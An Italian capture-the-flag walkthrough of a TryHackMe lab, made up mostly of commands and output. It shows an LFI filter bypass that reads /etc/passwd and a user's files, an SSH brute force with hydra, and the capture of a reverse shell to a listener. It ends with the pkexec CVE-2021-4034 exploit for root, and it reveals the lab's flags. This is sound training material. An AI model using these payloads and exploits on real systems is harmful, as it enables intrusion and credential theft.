#tryhackmelabs #laboratorio 

https://tryhackme.com/room/redisl33t

La partita è iniziata e Red ha preso il comando.  
Ma tu sei Blue e solo tu puoi sconfiggere Red.  
  
Tuttavia, Red ha implementato alcuni meccanismi di difesa che renderanno la battaglia un po' difficile:  
1. Red è noto per cacciare gli avversari dalla macchina. C'è un modo per aggirarlo?  
2. Red ama cambiare le password degli avversari, ma tende a mantenerle pressoché invariate.   
3. Red ama provocare gli avversari per distrarli. Mantieni la mente acuta!  
  
Questa è una battaglia unica, e se ti senti all'altezza della sfida, allora fallo pure!

Effettuiamo una prima scansione con nmap
```
nmap -Pn -v -O -p- 10.10.199.6
```

```
└─# nmap -Pn -v -O -p- 10.10.199.6
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-10 08:14 EDT
Initiating Parallel DNS resolution of 1 host. at 08:14
Completed Parallel DNS resolution of 1 host. at 08:14, 0.03s elapsed
Initiating SYN Stealth Scan at 08:14
Scanning 10.10.199.6 [65535 ports]
Discovered open port 22/tcp on 10.10.199.6
Discovered open port 80/tcp on 10.10.199.6
Completed SYN Stealth Scan at 08:14, 35.75s elapsed (65535 total ports)
Initiating OS detection (try #1) against 10.10.199.6
Retrying OS detection (try #2) against 10.10.199.6
WARNING: OS didn't match until try #2
Nmap scan report for 10.10.199.6
Host is up (0.049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Uptime guess: 25.385 days (since Sat Jun 14 23:00:25 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros

Read data files from: /usr/share/nmap
OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.70 seconds
           Raw packets sent: 66199 (2.914MB) | Rcvd: 66064 (2.644MB)

```

```
nmap -sVC -p22,80 10.10.199.6
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
|   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
|_  256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
vediamo con un browser cosa c'è all'indirizzo
```
http://10.10.199.6/
```

vediamo cosa utilizza il webserver
```
whatweb http://10.10.199.6/index.php?page=home.html
```
```
└─# whatweb http://10.10.199.6/index.php?page=home.html
http://10.10.199.6/index.php?page=home.html [200 OK] Apache[2.4.41], Bootstrap[3.0.0], Country[RESERVED][ZZ], Email[contact@webthemez.com], Google-API[ajax/libs/jquery/1.10.2/jquery.min.js], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.199.6], JQuery[1.10.2], Meta-Author[webThemez.com], Modernizr[latest], Script, Title[Atlanta - Free business bootstrap template]                                                                                                              
```

facciamo un enumerazione dei file de directory del sito
```
gobuster dir -u http://10.10.199.6 -w /usr/share/wordlists/dirb/common.txt -t50 
```

```
└─# gobuster dir -u http://10.10.199.6 -w /usr/share/wordlists/dirb/common.txt -t50 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.199.6
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 311] [--> http://10.10.199.6/assets/]
/.htpasswd            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/index.php            (Status: 302) [Size: 0] [--> /index.php?page=home.html]
/server-status        (Status: 403) [Size: 276]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished

```

noto ciò che mi è sfuggito precedentemente, cioè la composizione della URL home

```
http://10.10.199.6/index.php?page=home.html
```

`?page=home.html` Potrebbe essere vulnerabile a LFI/RFI in quanto visualizzata con un parametro di pagina

proviamo a trovare qualcosa per sfruttare questa vulnerabiltà con BurpSuite

catturiamo la richiesta
```
GET /index.php?page=home.html HTTP/1.1
Host: 10.10.199.6
User-Agent: J
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
la inviamo all'intruder
e proviamo con una lista per il Path Traversal ma senza successo!

**C'è una sanetizzazione in atto in quanto tutte le prove ci riportano alla home page**

Troviamo il codice del filtro utilizzato in
```
view-source:http://10.10.199.6/index.php?page=index.php
```

```
<?php 
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}
$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}
?>
```
- Utilizza `str_replace` per rimuovere le sequenze di caratteri `../` e `./` dal parametro
- Utilizza `readfile($page)` per leggere e inviare il contenuto del file specificato dal parametro `$page` al browser. 

Anche se ci sono tentativi di sanitizzazione, l'uso di `readfile` con input dell'utente può portare a vulnerabilità di inclusione di file, specialmente se non ci sono ulteriori controlli sui file consentiti.

per bypassare il filtro utilizziamo il

```
php://filter/resource=/etc/passwd
```

```
http://10.10.199.6/index.php?page=php://filter/resource=/etc/passwd
```

ed otteniamo

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin blue:x:1000:1000:blue:/home/blue:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false red:x:1001:1001::/home/red:/bin/bash
```

abbiamo gli utenti red ed blue

**nota**
leggendo il codice di sanitizzazione notiamo anche che esiste la condizione se il codice inizia con una lettera minuscola quindi può essere bypassato anche nel seguente modo
```
http://10.10.199.6/index.php?page=a/.....///.....///.....///.....///etc/passwd
```

ora se cerchiamo nel history bash di blue  
```
http://10.10.199.6/index.php?page=php://filter/resource=/home/blue/.bash_history
```
troviamo
```
echo "Red rules" cd hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt cat passlist.txt rm passlist.txt sudo apt-get remove hashcat -y
```

```
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```
In sintesi, il comando genera una lista di password utilizzando le parole nel file `.reminder` e applicando le trasformazioni definite nel file di regole `best64.rule`, quindi salva il risultato in `passlist.txt`

ora per ricreare il file contenente la lista delle password dobbiamo leggere il contenuto del file '.reminder'

```
http://10.10.199.6/index.php?page=php://filter/resource=/home/blue/.reminder
```
```
sup3r_p@s$w0rd!
```

ora che abbiamo il contenuto del file possiamo ricreare la lista delle password in locale su nostro kali

```
nano .reminder
```
```
sup3r_p@s$w0rd!
```

```
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```
per visualizzare la lista delle password create facciamo
```
cat passlist.txt
```

ora possiamo trovare la password di blue con hydra

```
hydra -l blue -P passlist.txt 10.10.199.6 ssh -v -f
```

```
[VERBOSE] Disabled child 11 because of too many errors
[22][ssh] host: 10.10.199.6   login: blue   password: sup3r_p@s$w0rd!123
[STATUS] attack finished for 10.10.199.6 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-10 11:17:28

```

```
ssh blue@10.10.199.6
```
	sup3r_p@s$w0rd!123

```
6 updates could not be installed automatically. For more details,
see /var/log/unattended-upgrades/unattended-upgrades.log

*** System restart required ***
Last login: Mon Apr 24 22:18:08 2023 from 10.13.4.71
blue@red:~$ 

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


6 updates could not be installed automatically. For more details,
see /var/log/unattended-upgrades/unattended-upgrades.log

*** System restart required ***
Last login: Mon Apr 24 22:18:08 2023 from 10.13.4.71
blue@red:~$ Fine here is the root password WW91IGFyZSBhIGxvc2VyIEJsdWU=

```

```
cat flag1
```

```
ls
flag1
blue@red:~$ cat flag1
THM{Is_thAt_all_y0u_can_d0_blU3?}
```

e nel frattempo dopo essere stati trollati veniamo buttati fuori!

Qual è la prima bandiera?
```
THM{Is_thAt_all_y0u_can_d0_blU3?}
```

Qual è la seconda bandiera?

eseguiamo
```
ps -auxw
```
per capire i processi attivi e cosa ci butta fuori
```
root       18293  0.0  0.0      0     0 ?        I    15:25   0:00 [kworker/u30:1-events_unbound]
root       18649  0.0  0.0      0     0 ?        I    15:39   0:00 [kworker/0:2-events]
root       18650  0.0  0.0      0     0 ?        I    15:39   0:00 [kworker/1:2-events]
red        18698  0.0  0.0   6972  2508 ?        S    15:41   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
red        18719  0.0  0.0   6972  2592 ?        S    15:42   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
root       18722  0.0  0.0      0     0 ?        I    15:42   0:00 [kworker/u30:2-events_unbound]
root       18783  0.0  0.0      0     0 ?        I    15:42   0:00 [kworker/0:3-memcg_kmem_cache]
root       18860  0.2  0.2  13960  9092 ?        Ss   15:42   0:00 sshd: blue [priv]

```
C'è una reverse shell in esecuzione sotto l'utente Red che punta a 'redrules.thm'

Per verificare quali attributi sono impostati per il `/etc/hosts`file possiamo usare lsattr `lsattr /etc/hosts`.
```
lsattr /etc/hosts
```

```
blue@red:~$ Fine here is the root password WW91IGFyZSBhIGxvc2VyIEJsdWU=
lsattr /etc/hosts
-----a--------e----- /etc/hosts
```

```
echo "<Your IP Address> redrules.thm" >> /etc/hosts
```

```
echo "10.14.99.134 redrules.thm" >> /etc/hosts
```

ci mettiamo in ascolto sulla nostra macchina kali
```
nc -lvnp 9001
```
otteniamo la reverse shell
```
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.199.6] 43658
bash: cannot set terminal process group (18999): Inappropriate ioctl for device
bash: no job control in this shell
red@red:~$ 

```

```
cat flag2
```

```
red@red:~$ id
id
uid=1001(red) gid=1001(red) groups=1001(red)
red@red:~$ ls
ls
flag2
red@red:~$ cat flag2
cat flag2
THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}
red@red:~$ 

```

```
THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}
```

Qual è la terza bandiera?

```
ls -al
```

```
drwxr-xr-x 4 root red  4096 Aug 17  2022 .
drwxr-xr-x 4 root root 4096 Aug 14  2022 ..
lrwxrwxrwx 1 root root    9 Aug 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 red  red   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 red  red  3771 Feb 25  2020 .bashrc
drwx------ 2 red  red  4096 Aug 14  2022 .cache
-rw-r----- 1 root red    41 Aug 14  2022 flag2
drwxr-x--- 2 red  red  4096 Aug 14  2022 .git
-rw-r--r-- 1 red  red   807 Aug 14  2022 .profile
-rw-rw-r-- 1 red  red    75 Aug 14  2022 .selected_editor
-rw------- 1 red  red     0 Aug 17  2022 .viminfo

```

```
cd .git
```

```
red@red:~$ cd .git
cd .git
red@red:~/.git$ ls -al
ls -al
total 40
drwxr-x--- 2 red  red   4096 Aug 14  2022 .
drwxr-xr-x 4 root red   4096 Aug 17  2022 ..
-rwsr-xr-x 1 root root 31032 Aug 14  2022 pkexec
```

```
./pkexec --version
```
```
pkexec version 0.105
```

Cercando la versione di pkexec su Google, si può vedere una vulnerabilità: CVE-2021-4034

```
https://github.com/joeammond/CVE-2021-4034
```
scarichiamo l'exploit in python
```
git clone https://github.com/joeammond/CVE-2021-4034.git
```

```
cd CVE-2021-4034
```
personalizziamo l'exploit
```
nano CVE-2021-4034.py
```
modifichiamo l'ultima riga che indica la posizione di pkexec
```
libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)
```
in
```
libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)
```
creiamo un server per il trasferimento del file
```
python3 -m http.server 8080
```
sulla macchina vittima digitiamo
```
wget http://10.14.99.134:8080/CVE-2021-4034.py
```

```
python3 CVE-2021-4034.py
```

```
python3 CVE-2021-4034.py
[+] Creating shared library for exploit code.
[+] Calling execve()
# id
id
uid=0(root) gid=1001(red) groups=1001(red)
# 
```
Siamo root! Andiamo a leggere la terza flag!
```
pwd
/home/red/.git
# cd /root
cd /root
# ls
ls
defense  flag3  snap
# cat flag3
cat flag3
THM{xxxxxxxxx}

```

```
THM{xxxxxxxxxxxxx}
```

